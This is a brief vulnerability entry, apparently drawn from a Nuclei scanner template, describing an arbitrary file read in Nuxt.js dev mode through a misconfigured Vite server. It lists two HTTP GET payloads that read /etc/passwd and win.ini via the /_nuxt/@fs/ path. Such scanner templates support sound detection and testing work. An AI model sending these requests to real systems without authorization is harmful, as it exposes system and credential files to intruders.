# Vulnerability: Arbitrary File Read in Dev Mode - Nuxt.js
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`nuxt-js-lfi.yaml`)

## Description
Vite is misconfigured within nuxt to permit any file to be retrieved from the file system.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/_nuxt/@fs/etc/passwd
GET {{BaseURL}}/_nuxt/@fs/windows/win.ini
```

